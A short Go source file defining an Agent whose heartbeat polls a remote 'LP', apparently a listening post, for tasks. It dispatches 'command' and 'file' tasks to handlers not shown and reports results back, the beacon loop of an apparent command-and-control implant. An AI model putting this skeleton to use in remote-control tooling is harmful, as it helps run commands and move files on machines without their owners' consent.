package app

import (
	"encoding/json"

	"../comm"
)

type Agent struct {
	client comm.Client
}

func NewAgent(client comm.Client) *Agent {
	return &Agent{client: client}
}

func (a *Agent) sendMsg(agentMsg *AgentMsg) (*LPMsg, error) {
	var lpMsg LPMsg
	msg, err := json.Marshal(agentMsg)
	if err != nil {
		return nil, err
	}
	response, err := a.client.SendMsg(msg)
	if err != nil {
		return nil, err
	}
	err = json.Unmarshal(response, &lpMsg)
	if err != nil {
		return nil, err
	}
	return &lpMsg, nil
}

func (a *Agent) Heartbeat() error {
	agentMsg := &AgentMsg{
		GetTasksMsg: &GetTasksMsg{},
	}
	lpMsg, err := a.sendMsg(agentMsg)
	if err != nil {
		return err
	}
	if taskLisgMsg := lpMsg.TaskListMsg; taskLisgMsg != nil {
		var taskResults []TaskResult
		for _, task := range taskLisgMsg.Tasks {
			var taskResult TaskResult
			switch task.Type {
			case "command":
				taskResult = handleCommandTask(task)
			case "file":
				taskResult = handleFileTask(task)
			}
			taskResults = append(taskResults, taskResult)
		}
		if len(taskResults) > 0 {
			agentMsg := &AgentMsg{
				TaskResultsMsg: &TaskResultsMsg{
					Results: taskResults,
				},
			}

			_, err := a.sendMsg(agentMsg)
			return err
		}
	}

	return nil
}
